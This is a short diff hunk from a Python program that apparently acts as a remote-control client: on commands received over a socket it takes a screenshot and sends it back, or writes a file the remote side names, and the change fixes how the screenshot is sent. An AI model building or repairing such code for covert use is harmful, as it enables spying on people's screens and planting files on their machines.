@@ -32,7 +32,7 @@ try:
             th.start()
         elif data == "3":
             pyautogui.screenshot().save("screen.png")
-            client.sendfile("screen.png")
+            client.sendfile(open("screen.png","rb"))
             client.send("end".encode())
         elif "img" in data:
             with open(data.split(" ")[1],"wb") as file:
